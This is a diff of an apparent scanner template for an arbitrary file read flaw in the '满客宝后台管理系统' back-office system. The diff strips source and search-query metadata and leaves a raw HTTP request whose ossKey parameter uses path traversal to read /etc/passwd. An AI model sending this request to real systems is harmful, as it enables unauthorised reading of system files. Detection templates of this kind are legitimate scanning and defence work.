@@ -3,12 +3,8 @@ info:
   name: 满客宝后台管理系统 downloadProviderFile 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sfh3t7stt687bic5'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sfh3t7stt687bic5
-    fofa: body="满客宝后台管理系统"
 http:
 - raw:
   - 'GET /warehouse/api/v1/provider/downloadProviderFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd HTTP/1.1
